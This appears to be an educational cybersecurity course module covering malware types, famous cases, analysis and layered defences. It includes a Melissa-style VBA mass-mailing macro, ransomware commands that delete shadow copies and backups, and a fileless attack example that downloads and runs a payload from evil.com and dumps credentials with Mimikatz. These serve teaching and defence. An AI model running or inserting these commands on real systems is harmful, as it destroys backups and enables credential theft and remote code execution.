☠️

Definition

Definition
Malware (malicious software) is any program intentionally designed to disrupt, damage, gain unauthorised access to, or steal data from a computer system. It encompasses all hostile or intrusive software regardless of how it spreads, what it does, or what it targets.

Topic 74

Virus

HIGH🦠

Definition

Definition
A computer virus is a type of malware that attaches itself to a legitimate host file or program and replicates when the infected host is executed. Like a biological virus, it requires a host to spread. It cannot propagate on its own without human action (opening the infected file).

Types of Viruses

Virus TypeInfection TargetHow It SpreadsExample
File InfectorExecutable files (.exe, .com)Appends/prepends code to legitimate exe; spreads when runJerusalem virus, CIH (Chernobyl)
Macro VirusOffice documents (.doc, .xls, .ppt)Embedded in macros; runs when document opened; spreads via emailMelissa (1999), Concept
Boot Sector VirusMBR / boot sector of diskInfects when infected disk boots; spreads via shared disksStoned, Michelangelo
Polymorphic VirusAny executableChanges own code/signature each time — evades signature AVStorm Worm, Simile
Metamorphic VirusAny executableCompletely rewrites itself — most advanced AV evasionW32/Simile, Zperm
Multipartite VirusBoot + files simultaneouslyInfects both boot sector AND files — harder to removeGhostball, Tequila
Resident VirusMemory (RAM)Loads into memory, infects any program accessed by OSRandex, CMJ

Virus Lifecycle

Dormant: Virus attached to host file, waiting
Propagation: User opens infected file → virus copies itself to other files
Trigger: Condition met (date, counter, event)
Execution: Payload activates — delete files, encrypt, display message

Famous Case: Melissa Virus (1999)

MELISSA MACRO VIRUS
Type:    Macro virus in Microsoft Word document
Vector:  Email attachment "LIST.DOC" — "Important Message from [name]"
Payload: Macro automatically emailed infected doc to first 50 Outlook contacts

Impact:
  → 1 million computers infected in 3 days
  → Email servers crashed worldwide (overloaded 300%)
  → $80 million in damages
  → Intel, Microsoft, US Marine Corps took email systems offline

How it worked:
Sub AutoOpen()
  ' Opens automatically when document is opened
  Set app = ActiveDocument.Application
  Set outlook = app.CreateObject("Outlook.Application")
  For Each recipient In outlook.AddressLists(1).AddressEntries
    Set mail = outlook.CreateItem(0)
    mail.Recipients.Add recipient
    mail.Subject = "Important Message From " & UserName
    mail.Body = "Here is that document you asked for"
    mail.Attachments.Add ActiveDocument.FullName
    If mail.Recipients.Count = 50 Then Exit For
    mail.Send
  Next recipient
End Sub

Defence: Disable automatic macro execution in Office settings
🔬 Exercise
  1. How does a polymorphic virus evade signature-based antivirus? What type of detection could still catch it?
  2. Why do macro viruses thrive in phishing attacks? What Office security setting prevents automatic macro execution?
📌 Conclusion

Viruses were the original malware threat. Today, they remain relevant through macro viruses in Office documents — still a top phishing payload. Defences: disable macros, up-to-date AV, sandboxed email attachment scanning, and user training to never enable macros from unknown sources.

Topic 75

Worm

CRITICAL🪱

Definition

Definition
A worm is self-replicating malware that spreads across networks without requiring user interaction and without needing a host file. It exploits vulnerabilities in network services, OS, or applications to propagate autonomously. Worms can spread exponentially — infecting millions of devices in hours.

Worm vs Virus

🦠 Virus

  • Requires a host file to attach to
  • Needs user interaction to spread (opening file)
  • Spreads slowly — limited by human action
  • Infects local files primarily
  • Easier to contain (isolate infected files)

🪱 Worm

  • Standalone — no host needed
  • Spreads AUTOMATICALLY — no user action
  • Can spread exponentially at network speed
  • Propagates across networks to new machines
  • Harder to contain — requires network isolation

Famous Worms

1988
Morris Worm — First Major Worm
Robert Morris (Cornell student). Exploited Unix sendmail, fingerd, rsh/rexec. Infected ~6,000 machines (10% of internet). First conviction under Computer Fraud and Abuse Act. Caused $100M damage.
2001
Code Red Worm
Exploited IIS buffer overflow. Infected 359,000 machines in 14 hours. Defaced websites with "HACKED BY CHINESE". DDoS'd White House website. No user interaction — scanned port 80 randomly.
2003
SQL Slammer — Fastest Worm Ever
Exploited SQL Server buffer overflow (UDP port 1434). Doubled every 8.5 seconds. Infected 75,000 servers in 10 minutes. Caused internet slowdowns, ATM outages, airline check-in failures. Entire worm was 376 bytes!
2004
Mydoom Worm
Spread via email attachment. Fastest-spreading worm ever at time. Peaked at 1-in-12 emails worldwide. Created DDoS botnet against SCO, Microsoft. $38 billion in damages.
2010
Stuxnet — Nation-State Worm
Targeted Siemens PLCs in Iranian nuclear centrifuges. Spread via USB, then network shares. Used FOUR zero-days (unprecedented). Physically destroyed ~1,000 centrifuges. First known cyber weapon to cause physical destruction.
2017
WannaCry Ransomworm
Combined ransomware payload with EternalBlue worm (SMB exploit). 230,000 machines in 150 countries in 24 hours. NHS UK paralysed. Halted by Marcus Hutchins' "kill switch" — registered an unregistered domain.

How Worms Spread — Propagation Methods

WORM PROPAGATION
1. Network Scanning (most common):
   Worm scans random IP ranges on vulnerable port (e.g., 445/SMB)
   → Finds vulnerable host → exploits it → installs copy → repeats
   Example: SQL Slammer scanned all 4 billion IPv4 addresses in 10 mins!

2. Email Worm:
   Accesses victim's contact list → sends itself as attachment to all
   Example: Mydoom sent itself to all Outlook contacts

3. Removable Media (USB) Worm:
   Creates autorun.inf on USB → executes on insertion
   Example: Stuxnet spread into air-gapped nuclear facility via USB

4. P2P/File Sharing:
   Disguises itself as desirable files on P2P networks
   Example: Blaster worm spread via Windows file shares

5. Instant Messaging:
   Sends malicious link to all IM contacts
   Example: Koobface spread via Facebook messages

# Why WannaCry spread so fast:
EternalBlue exploit → port 445 (SMBv1) → no user interaction
NSA developed EternalBlue → stolen by Shadow Brokers → published April 2017
Microsoft patched it March 2017 (MS17-010) — most hadn't applied it!
🔬 Exercise
  1. Why did WannaCry spread so much faster than traditional ransomware? What specific vulnerability enabled this?
  2. Why is disabling SMBv1 and applying patches immediately critical defence against worms?
  3. Stuxnet spread into an air-gapped (no internet) facility. How? What does this tell us about USB device security?
📌 Conclusion

Worms are the most dangerous malware in terms of propagation speed. When a critical CVE is disclosed, attackers will weaponise it as a worm within days. Patch management is not optional — unpatched systems are the oxygen that worm fires need to spread exponentially.

Trojan

HIGH🐴

Definition

Definition
A Trojan horse (or Trojan) is malware that disguises itself as legitimate, desirable software to trick users into installing it. Unlike viruses, Trojans do not self-replicate. They rely on social engineering — the user must be deceived into running it.

Downloader TrojanDownloads and installs additional malwareEmotet (as downloader), TrickbotMalicious email attachment
Dropper TrojanDrops payload on disk then self-destructsStage 1 of most APT toolchainsExploit → dropper → payload
Info-stealer TrojanHarvests credentials, browser data, crypto walletsRedLine Stealer, Raccoon, VidarCracked software, phishing
Ransomware DropperDelivers ransomware payloadEmotet → TrickBot → RyukMalicious email

RAT Deep Dive

RAT CAPABILITIES
# RAT (Remote Access Trojan) gives attacker full control:
Surveillance:
  → Live screen capture / screen recording
  → Webcam activation (often without indicator light)
  → Microphone recording
  → Screenshot at intervals

Data theft:
  → File browser — browse, download, upload, delete files
  → Credential harvesting — browser passwords, saved passwords
  → Clipboard monitoring — captures copied passwords
  → Keystroke logging

System control:
  → Remote shell — execute any command
  → Process management — kill AV/EDR processes
  → Registry manipulation — add persistence keys
  → DDoS participation — use victim as bot

# Notable RAT attack — Operation Aurora 2009:
# Chinese APT (Elderwood group) used Poison Ivy RAT
# Targeted: Google, Adobe, Juniper Networks, 33+ companies
# Entry: spear-phishing email → IE zero-day exploit → RAT installed
# Goal: steal source code, access Gmail accounts of Chinese activists

# Defence: EDR, application allowlisting, network monitoring for C2 traffic

📌 Conclusion

Trojans are the most deployed malware type because they bypass technical defences using human psychology. The user installs them voluntarily, believing they're getting something useful. Defence begins with user education, followed by application control (allowlisting) and endpoint detection that catches suspicious behaviour post-execution.

Topic 77

Ransomware

CRITICAL💰

Definition

Definition
Ransomware is malware that encrypts a victim's files or locks their system, then demands payment (ransom) — typically in cryptocurrency — for the decryption key. Modern ransomware operations use double extortion: encrypt AND exfiltrate data, threatening to publish it publicly if ransom is unpaid.

Ransomware Kill Chain

1️⃣ INITIAL ACCESS — Phishing email / RDP brute force / VPN exploit
2️⃣ EXECUTION — Malicious attachment opens, dropper installs ransomware loader
3️⃣ PRIVILEGE ESCALATION — Gain admin rights to access more files
4️⃣ LATERAL MOVEMENT — Spread to other systems (file shares, backups)
5️⃣ DATA EXFILTRATION — Copy sensitive data to attacker server (double extortion)
6️⃣ ENCRYPTION — AES-256 encrypts files; RSA-2048 protects AES key
7️⃣ RANSOM NOTE — Bitcoin wallet shown; 72hr countdown; leak site threat

Ransomware Cryptography

HOW RANSOMWARE ENCRYPTION WORKS
# Why victim CANNOT decrypt without paying:

Attacker:
  1. Generates RSA-2048 key pair (on C2 server)
  2. Embeds RSA PUBLIC key in ransomware binary

On victim machine:
  3. Ransomware generates unique AES-256 key per file (or session)
  4. Encrypts each file with its AES-256 key
  5. Encrypts the AES key with RSA PUBLIC key → stores in file header
  6. DELETES the plaintext AES key from memory

Result:
  File:   [RSA_encrypted(AES_key)] + [AES_encrypted(file_data)]
  Only RSA PRIVATE KEY (with attacker) can decrypt AES key
  → Victim CANNOT recover AES key without paying

# Shadow copy deletion (standard ransomware technique):
vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled No
# Destroys Windows backup volumes before encrypting

# Defence:
→ 3-2-1 backup rule: 3 copies, 2 media, 1 offsite/offline
→ Offline backups: air-gapped or immutable (S3 Object Lock)
→ Canary files: honeypot files alert on encryption attempts

Ransomware-as-a-Service (RaaS)

💼
Ransomware-as-a-Service (RaaS): Criminal groups like LockBit, BlackCat, and Hive operate like software companies. They develop ransomware and lease it to "affiliates" (less skilled criminals) for a 20-30% cut of ransoms. The affiliate handles infection, negotiation, and payment. The developer provides the ransomware kit, leak site, customer service (!), and cryptocurrency laundering. This lowered the skill barrier to launching ransomware attacks dramatically.
🔬 Exercise
  1. Why does ransomware use asymmetric encryption (RSA) to protect the symmetric key (AES) rather than just using AES directly?
  2. The Colonial Pipeline attack started with a compromised VPN password. What single security control would have prevented it?
  3. Design a backup strategy that would allow a company to recover from ransomware within 4 hours without paying.
📌 Conclusion

Ransomware is the most economically damaging cyber threat today. The industrialisation of RaaS means any criminal can now deploy sophisticated ransomware. Defences: offline/immutable backups (the only true counter), MFA everywhere, patch management, network segmentation to limit spread, and email filtering.

Topic 78

Spyware

HIGH👁️

Definition

Definition
Spyware secretly monitors a user's activities and transmits information to a remote party without the user's knowledge or consent. It operates silently in the background, designed to be undetectable while gathering credentials, personal data, communications, and behavioural patterns.

Spyware Capabilities

⌨️
Keystroke Logging
Records every key pressed — passwords, messages, credit cards, PIN numbers.
📸
Screenshots
Periodic screen captures. Sends to C2. Captures banking portals, sensitive documents.
📷
Webcam / Mic
Silently activates camera and microphone. Used in surveillance of high-value targets.
📍
Location Tracking
GPS coordinates (mobile spyware). Movement patterns, visited locations, travel behaviour.
💬
Message Interception
Reads SMS, WhatsApp, iMessage, Signal (at OS level — bypasses E2EE). Pegasus capability.
🌐
Browser History
All visited URLs, search queries, saved passwords, cookies, browsing patterns.

Pegasus Spyware — Advanced Case Study

PEGASUS SPYWARE (NSO GROUP)
Developer: NSO Group (Israel) — commercial spyware sold to governments
Target:    Journalists, activists, politicians, government officials
Cost:      ~$500,000+ per deployment license

Technical capabilities:
→ Zero-click installation (no user interaction required!)
→ Exploits iMessage, WhatsApp zero-days
→ Achieves kernel-level access on iOS and Android
→ Reads ALL messages (including E2EE Signal, WhatsApp) from memory
→ Activates camera and microphone silently
→ Extracts encryption keys from device
→ Self-destructs if it detects forensic analysis

Notable targets:
→ Jamal Khashoggi (journalist, later murdered) — Saudi Arabia
→ Emmanuel Macron (French President) — suspected
→ 50,000 phone numbers in leaked list (2021 Amnesty International)
→ 14 world leaders' numbers on targeting list

Key lesson: Even fully patched, updated devices can be compromised
by nation-state spyware using zero-click zero-days

Detection: Amnesty International Mobile Verification Toolkit (MVT)

Spyware vs Legitimate Monitoring

⚖️
Legal grey area: Parental control software, employee monitoring tools, and law enforcement lawful interception all share technical similarities with spyware. The distinction is: consent and disclosure. Spyware = installed covertly without consent. Legitimate monitoring = disclosed (employee handbook, terms of service, court order). GDPR requires explicit consent for monitoring — covert monitoring of employees without disclosure is illegal in the EU.
🔬 Exercise
  1. Pegasus can read Signal messages despite their end-to-end encryption. Explain how this is possible (hint: it's not breaking the encryption).
  2. What is the difference between spyware and a keylogger? Could one tool be both?
📌 Conclusion

Spyware represents the surveillance dimension of malware. Commercial spyware like Pegasus demonstrates that even state-of-the-art security can be bypassed with sufficient resources. For most users, defence means patching immediately, avoiding suspicious links, and being aware that any device can potentially be compromised.

Topic 79

Adware

LOW-MED📢

Definition & Characteristics

Definition
Adware automatically delivers unwanted advertisements to generate revenue for the attacker. Usually bundled with free software (PUP — Potentially Unwanted Program). While less damaging than other malware, adware is often a gateway to more serious infections and degrades system performance.

Adware Behaviours & Risks

BehaviourImpactSecurity Risk
Pop-up adsDisrupts workflow, degrades performanceMalvertising — ads can contain exploits or redirect to phishing
Browser hijackingChanges homepage, search engine, installs extensionsFake search results, phishing redirects, credential theft
Tracking & profilingMonitors browsing habits, sells data to advertisersPrivacy violation, targeted phishing using personal data
Bundled installationInstalls alongside legitimate software (default yes)Often bundles additional malware or PUPs
Fake update promptsTricks user into installing more malwareClassic vector: "Flash Player update required" → Trojan
⚠️
Adware → Serious Malware Gateway: Adware often enables drive-by download attacks. A malicious ad (malvertising) can contain JavaScript exploits that silently install ransomware or Trojans when clicked — or even just viewed (zero-click exploits). The 2016 Angler exploit kit used malvertising on major news sites to deploy CryptoWall ransomware. No suspicious downloads required.
🔬 Exercise
  1. You download a free video converter and notice your browser homepage changed and you see constant ads. What happened? How do you remove it?
  2. What is malvertising? Why is it dangerous even on reputable websites?
📌 Conclusion

Never install software from unofficial sources, always use custom install (uncheck bundled offers), install an ad blocker (uBlock Origin), and keep browsers updated. Adware is the "gateway drug" of malware — it signals a compromised security posture that more dangerous threats will exploit.

Topic 80

Rootkits

CRITICAL🕳️

Definition

Definition
A rootkit is malware designed to hide itself and other malicious processes from the operating system, security tools, and users — while maintaining privileged (root/admin) access. The name combines "root" (Unix superuser) and "kit" (set of tools). Rootkits modify OS core functions to conceal their presence.

Rootkit Types by Privilege Level

ROOTKIT PRIVILEGE LEVELS
Ring 0 — Kernel Rootkit (most dangerous)
  Operates at kernel level — highest OS privilege
  Can intercept ANY system call, hide ANY file/process
  Example: Necurs, ZeroAccess — hide from all AV/EDR tools
  Detection: Compare running process list via API vs raw disk scan

Ring -1 — Hypervisor Rootkit (virtualization-based)
  Moves OS into VM, sits BELOW the OS
  OS cannot detect it — it's in a different privilege level
  Example: Blue Pill (proof-of-concept), Vbootkit

Ring -2/-3 — Firmware/UEFI Rootkit (most persistent)
  Flashed into UEFI/BIOS firmware or hard drive firmware
  Survives OS reinstall, full disk wipe
  Example: LoJax (APT28/Fancy Bear), CosmicStrand, MosaicRegressor
  Detection: UEFI firmware integrity check tools

Ring 3 — User-mode Rootkit (application level)
  Hooks Windows API calls (DLL injection, API hooking)
  Hides files, processes, network connections at API level
  Easier to detect — doesn't control kernel
  Example: Hacker Defender (Windows)

Bootkit
  Infects Master Boot Record (MBR) or VBR
  Loads before OS — can intercept boot process
  Example: TDL4/Alureon, Rovnix

How Rootkits Hide

What's HiddenTechniqueDetection Method
Files/directoriesHook FindFirstFile/FindNextFile API — filter out rootkit files from resultsCompare API results vs raw disk sector scan
Running processesRemove process from kernel DKOM (Direct Kernel Object Manipulation) linked listCross-view detection — multiple process enumeration methods
Network connectionsHook socket/TCP table APIs — remove C2 connections from netstat outputRaw network packet capture vs API comparison
Registry keysHook RegQueryKey/RegEnumKey — hide persistence keysOffline registry hive analysis
Loaded driversRemove from kernel driver listMemory forensics (volatility framework)
🔬 Exercise
  1. Why is a UEFI rootkit more dangerous than a kernel rootkit? What would you have to do to remove it?
  2. You run antivirus and it shows no infections, but your computer is behaving suspiciously. What might this indicate and how would you investigate?
📌 Conclusion

Rootkits represent the apex of malware stealth. A system with a kernel or UEFI rootkit cannot be trusted — the only safe remediation is complete system rebuild from verified media. Prevention through Secure Boot, UEFI passwords, and EDR tools with kernel protection (PatchGuard) is far more effective than trying to remove them.

Topic 81

Botnets

CRITICAL🤖

Definition

Definition
A botnet is a network of internet-connected devices infected with malware and controlled by an attacker (the botmaster) via a Command and Control (C2) server. Each infected device is called a bot or zombie. Botnets can contain thousands to millions of devices and are rented out for criminal purposes.

Botnet Architecture

BOTNET C2 ARCHITECTURE
Traditional Centralised C2:
          [Botmaster]
               │
          [C2 Server] ← single point of failure
         /     │     \
    [Bot1] [Bot2] [Bot3] ... [BotN]
    Weakness: Take down C2 = destroy botnet (sinkholing)

P2P Distributed C2 (more resilient):
    [Bot1] ↔ [Bot2] ↔ [Bot3]
      ↕                  ↕
    [Bot4] ↔ [Bot5] ↔ [Bot6]
    Bots relay commands to each other — no single C2 server
    Botmaster sends commands via any bot in the network
    Much harder to disrupt — used by Storm, Necurs, Gameover ZeuS

Domain Generation Algorithm (DGA) C2:
    Botnet generates hundreds of domain names daily from seed
    Attacker only needs to register ONE — bot will eventually find it
    Example: Conficker generated 50,000 domains per day
    Defence: Precompute DGA domains and register/sinkhole them first

Fast-flux DNS:
    C2 domain resolves to hundreds of different IPs (botted machines)
    IPs change every 3-5 minutes → takedown is impossible

What Botnets Do

UseDescriptionReal ExampleCriminal Revenue
DDoS-for-hireFlood target with traffic, crash servicesMirai DDoS'd Dyn DNS (took down Twitter, Netflix, Reddit)$10–$10,000 per attack
Spam emailSend billions of phishing/spam emailsNecurs botnet: 45 billion spam emails/day in peak$0.001–0.01 per 1000 emails
Credential stuffingTest stolen credentials across websitesSentry MBA botnet for account takeover$10–100 per valid credential
CryptominingMine Monero/Bitcoin using victim's CPU/GPUSmominru: 500,000 bots, $3.6M Monero mined$0.5–2/month per bot
Click fraudSimulate ad clicks to generate revenue3ve botnet: 1.7 billion fake ad views/dayHundreds of millions/year
Proxy servicesRoute criminal traffic through infected homesIPStorm: 23,000 residential proxies$1–5 per proxy per month

Mirai Botnet — IoT Case Study

🌐
Mirai (2016): Scanned the internet for IoT devices with default credentials (root/root, admin/1234, etc.). Infected 600,000 IoT devices — cameras, DVRs, routers. Launched 620 Gbps DDoS against journalist Brian Krebs. Then targeted Dyn DNS — took down Twitter, Netflix, Reddit, Spotify, GitHub, Amazon for 11 hours. The entire source code was leaked, spawning hundreds of Mirai variants still active today. Lesson: change default passwords on ALL IoT devices immediately.
🔬 Exercise
  1. Why is a P2P botnet harder to take down than a centralised C2 botnet? What technique would law enforcement use against each?
  2. How did Mirai infect 600,000 IoT devices without using any exploit? What does this tell us about IoT security?
📌 Conclusion

Botnets are the infrastructure of cybercrime. Your home router, baby monitor, or smart TV could be a botnet member right now — working for criminals without any visible symptoms. Defence: change default credentials, network segmentation for IoT devices, and ISP-level traffic monitoring (BCP38 to prevent spoofed DDoS traffic).

Topic 82

Keyloggers

HIGH⌨️

Definition & Types

Definition
A keylogger records every keystroke made on a keyboard, capturing passwords, messages, credit card numbers, and any other typed data. Keyloggers can be software-based (installed as malware) or hardware-based (physical devices plugged between keyboard and computer).

Software vs Hardware Keyloggers

💻 Software Keyloggers

  • Installed as malware (Trojan dropper)
  • Hooks Windows keyboard API (SetWindowsHookEx)
  • Kernel-level: captures ALL keystrokes OS-wide
  • User-level: only captures target application
  • Sends logs via email/FTP/HTTP to attacker
  • Detectable by AV/EDR (if not rootkitted)
  • Examples: Spyrix, Revealer, HawkEye, Agent Tesla

🔌 Hardware Keyloggers

  • Physical device between keyboard and USB port
  • Completely invisible to OS — no software to detect
  • Works on any OS, no installation required
  • Stores logs internally; attacker retrieves device later
  • KeyGrabber, KeyGhost, KeyCarbon devices
  • WiFi variants: transmit logs wirelessly
  • BIOS keylogger: firmware-level, survives reinstall

Keylogger Output Example

Topic 83

Fileless Malware

CRITICAL👻

Definition

Definition
Fileless malware executes entirely in memory (RAM) without writing malicious files to disk. It abuses legitimate system tools (PowerShell, WMI, mshta, regsvr32) to carry out attacks. Since there is no file on disk, traditional signature-based antivirus (which scans files) cannot detect it.

Living-off-the-Land (LotL) Attacks

FILELESS ATTACK EXAMPLE
# Scenario: Malicious Office macro launches fileless attack
# No malware file is written to disk at any point

Step 1: User opens malicious Word doc
  → Macro executes: cmd.exe /c powershell -nop -enc [base64 payload]

Step 2: PowerShell downloads payload INTO MEMORY (never to disk)
  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
  # IEX = Invoke-Expression: executes downloaded code directly in RAM

Step 3: Payload runs Mimikatz (credential dumper) in memory
  Invoke-Mimikatz -DumpCreds
  # Extracts LSASS memory → gets all logged-in user hashes/plaintext passwords

Step 4: Persistence via WMI subscription (no file needed)
  Set-WMIInstance -Class __EventFilter ... 
  # WMI event triggers payload on every boot — stored in WMI database, not a file

Step 5: Lateral movement via pass-the-hash
  # Use stolen NTLM hash to authenticate to other machines

# Why AV misses this:
→ No malicious file on disk = no signature to scan
→ Using legitimate Windows tools (LOLBins)

# Detection requires:
→ EDR with memory scanning and behavioral detection
→ PowerShell ScriptBlock logging (logs all executed PS code)
→ AMSI (Antimalware Scan Interface) — scans code in memory before execution
→ Constrained Language Mode for PowerShell

Common Living-off-the-Land Binaries (LOLBins)

Binary / ToolLegitimate PurposeAttacker Abuse
PowerShellSystem administration automationDownload/execute payloads, bypass AV, credential dumping
WMI (wmic.exe)System management queriesPersistence, lateral movement, remote execution
mshta.exeRun HTML applicationsExecute malicious VBScript/JScript from URL
certutil.exeCertificate managementDownload files from internet, base64 decode payloads
regsvr32.exeRegister COM DLLsExecute remote .SCT scripts — bypass AppLocker
rundll32.exeRun DLL functionsExecute malicious DLLs from memory or remote share
MimikatzN/A (offensive security tool)Dump Windows credentials from LSASS memory in cleartext

  1. Why does traditional file-scanning antivirus fail against fileless malware? What security capability is needed instead?
  2. What is Mimikatz? Why is it so powerful and why do attackers love it?
📌 Conclusion

Fileless malware represents the evolution of evasion techniques. It exploits the fact that defenders scan files but don't always monitor what runs in memory. EDR (Endpoint Detection & Response) with behavioural analysis, PowerShell logging, and AMSI are the key countermeasures — signature-based AV alone is insufficient.

Topic 84

Advanced Persistent Threat (APT)

CRITICAL🎯

Definition

Definition
An APT (Advanced Persistent Threat) is a sophisticated, long-term targeted attack typically carried out by nation-states or state-sponsored groups. They operate covertly inside a target network for months or years, with the goal of espionage, intellectual property theft, or destructive attacks. APTs are characterised by: Advanced (custom tools, zero-days), Persistent (long-term dwell), and Threat (human-directed, organised).

APT Lifecycle (MITRE ATT&CK)

Reconnaissance — OSINT, LinkedIn profiling, scanning target org
Weaponisation — Package exploit + payload into deliverable
Delivery — Spear-phishing email, watering hole, supply chain compromise
Exploitation — Zero-day or known CVE executes payload
Installation — RAT/backdoor installed; rootkit for persistence
C2 (Command & Control) — Encrypted communication to attacker
Lateral Movement — Pivot across internal network; escalate privileges
Actions on Objectives — Exfiltrate IP, spy on comms, destroy data

Topic 85

Malware Analysis Basics

🔬

Types of Malware Analysis

👁️ Static Analysis

  • Analyse malware WITHOUT executing it
  • File hash (SHA-256) — check VirusTotal
  • Strings extraction (readable text in binary)
  • PE header analysis (imports, exports, sections)
  • Disassembly (IDA Pro, Ghidra) — reverse engineer code
  • YARA rules — pattern matching for malware families
  • Safe but limited — can't see dynamic behaviour

⚡ Dynamic Analysis

  • Execute malware in controlled sandbox environment
  • Observe file system, registry, network activity
  • Tools: Cuckoo Sandbox, ANY.RUN, Joe Sandbox
  • Captures API calls, DNS queries, C2 communications
  • More accurate — sees real behaviour
  • Risk: malware may detect sandbox and behave differently
  • Hybrid: initial static → then dynamic

Indicators of Compromise (IoC)

IOC TYPES + THREAT INTELLIGENCE
IoC (Indicator of Compromise) — evidence of malware infection:

File-based IoCs:
  SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  File name: svchost32.exe  (legitimate svchost.exe never has numbers)
  File path: C:\Users\Public\svchost32.exe  (wrong location for svchost)

Network IoCs:
  IP: 185.220.101.45  (known Tor exit node / C2)
  Domain: update-service.windows-cdn.net  (fake Microsoft domain)
  URL: http://185.220.101.45/gate.php
  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0)  (outdated = suspicious)
  DNS queries: aGVs.update-svc.com  (base64-like DGA domain)

Host-based IoCs:
  Registry: HKCU\Software\Microsoft\Windows\Run\svchost32.exe
  Process: powershell.exe spawned by word.exe
  Network connection: lsass.exe has outbound TCP (never normal!)
  Scheduled task: named SystemUpdate with suspicious command

Threat Intelligence Feeds (share IoCs):
  MITRE ATT&CK  → TTP framework + group attribution
  VirusTotal     → File/URL/IP reputation
  OTX (AlienVault)→ Community IoC sharing
  ISACs          → Sector-specific threat sharing (FS-ISAC, H-ISAC)

Malware Analysis Lab Setup

🔬
Safe Analysis Environment: Always use an isolated VM (VMware/VirtualBox) with: host-only networking (no internet access), no shared folders to host, snapshot before analysis (revert after), no personal credentials, dedicated hardware if analysing advanced malware. Tools: REMnux (Linux malware analysis distro), FlareVM (Windows analysis), Wireshark, Process Monitor, Regshot, PEstudio, Ghidra (free NSA reverse engineering tool).

Topic 87

Prevention Techniques

🛡️

Defence Layers Against Malware

DEFENCE IN DEPTH
Layer 1: EMAIL SECURITY (First line — 94% of malware enters via email)
  → Email gateway scanning (ProofPoint, Mimecast)
  → Sandbox all attachments before delivery
  → SPF + DKIM + DMARC to prevent spoofed sender addresses
  → Block dangerous file types (.vbs, .js, .exe in email)

Layer 2: ENDPOINT PROTECTION
  → EDR (Endpoint Detection & Response): CrowdStrike, SentinelOne, Defender for Endpoint
  → Next-gen AV: Behavioural detection + ML (not just signatures)
  → Application Control/Allowlisting: only approved software can run (AppLocker, WDAC)
  → PowerShell: Constrained Language Mode + ScriptBlock logging
  → AMSI: Antimalware Scan Interface hooks into script engines

Layer 3: PATCH MANAGEMENT (closes worm/exploit entry points)
  → Patch Tuesday: apply within 7 days for critical CVEs
  → Vulnerability scanning: Nessus, Qualys — know what's unpatched
  → Asset inventory: can't patch what you don't know you have

Layer 4: NETWORK SECURITY
  → Network segmentation + VLANs: limit lateral movement blast radius
  → IDS/IPS: detect C2 traffic, port scans, lateral movement
  → DNS filtering: block known malicious domains (Cisco Umbrella)
  → Egress filtering: limit outbound connections to known services only

Layer 5: IDENTITY & ACCESS
  → MFA on everything: stolen credentials alone insufficient
  → Least privilege: users have minimum rights needed
  → LAPS: unique local admin passwords on every workstation
  → PAM: Privileged Access Management for admin accounts

Layer 6: BACKUP & RECOVERY (ransomware countermeasure)
  → 3-2-1 rule: 3 copies, 2 media types, 1 offsite/offline
  → Immutable backups: S3 Object Lock, Veeam hardened repo
  → Test restores quarterly: an untested backup is not a backup
  → Backup systems excluded from domain (ransomware can't reach)

Layer 7: DETECTION & RESPONSE
  → SIEM: correlate logs, detect kill chain stages
  → SOC: humans reviewing alerts 24/7
  → Threat Hunting: proactively search for hidden threats
  → IR Plan: documented, tested incident response procedure

User Training — The Human Layer

🧠
Security Awareness Training: 95% of breaches involve human error. Training topics: recognising phishing emails, handling suspicious attachments, reporting incidents, safe web browsing, social engineering awareness. Simulated phishing campaigns (KnowBe4, Proofpoint) measure and improve click rates. The goal is a "security culture" where every employee is a sensor, not a vulnerability.
